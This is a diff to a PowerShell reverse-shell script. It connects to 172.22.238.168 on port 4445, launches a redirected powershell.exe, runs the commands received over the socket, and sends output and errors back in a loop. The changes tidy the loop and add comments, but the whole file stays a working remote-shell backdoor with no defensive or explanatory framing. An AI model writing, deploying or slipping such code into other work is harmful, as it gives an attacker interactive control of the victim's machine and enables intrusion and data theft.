@@ -2,6 +2,7 @@ $TCPClient = New-Object System.Net.Sockets.TCPClient('172.22.238.168', 4445)
 $NetworkStream = $TCPClient.GetStream()
 $StreamWriter = New-Object System.IO.StreamWriter($NetworkStream)
 $StreamReader = New-Object System.IO.StreamReader($NetworkStream)
+
 $Process = New-Object System.Diagnostics.Process
 $Process.StartInfo.FileName = 'powershell.exe'
 $Process.StartInfo.RedirectStandardInput = $true
@@ -9,36 +10,37 @@ $Process.StartInfo.RedirectStandardOutput = $true
 $Process.StartInfo.RedirectStandardError = $true
 $Process.StartInfo.UseShellExecute = $false
 $Process.Start()
-$InputBuffer = New-Object System.Text.StringBuilder
 
-# Async output handling
-$OutputBuffer = New-Object System.Byte[] 4096
-$Encoding = [System.Text.Encoding]::ASCII
-
-while($true) {
-    # Check network stream
-    if($NetworkStream.DataAvailable) {
-        $Read = $NetworkStream.Read($OutputBuffer, 0, 4096)
-        $Command = $Encoding.GetString($OutputBuffer, 0, $Read)
-        $Process.StandardInput.WriteLine($Command)
-    }
-
-    # Check process output
-    if($Process.StandardOutput.Peek() -ne -1) {
+while (1) {
+    # Check network stream for incoming data
+    if ($NetworkStream.DataAvailable -eq $true) {
+        $OutputBuffer = New-Object byte[] 4096
+        $BytesRead = $NetworkStream.Read($OutputBuffer, 0, 4096)
+        $Command = [System.Text.Encoding]::ASCII.GetString($OutputBuffer, 0, $BytesRead)
+        
+        # Execute the received command
+        $Process.StandardInput.WriteLine($Command + "`n")
+        
+        # Read output from the process
         $Output = $Process.StandardOutput.ReadToEnd()
         $StreamWriter.Write($Output)
         $StreamWriter.Flush()
     }
 
-    # Error handling
-    if($Process.StandardError.Peek() -ne -1) {
+    # Check for errors
+    if ($Process.StandardError.Peek() -ne -1) {
         $ErrorOutput = $Process.StandardError.ReadToEnd()
         $StreamWriter.Write("[ERROR] $ErrorOutput")
         $StreamWriter.Flush()
     }
 
+    # Sleep for 100ms to avoid busy-waiting
     Start-Sleep -Milliseconds 100
-    if($TCPClient.Connected -ne $true) { break }
+
+    # Check if the TCP connection is still active
+    if ($TCPClient.Connected -eq $false) {
+        break
+    }
 }
 
 $StreamWriter.Close()
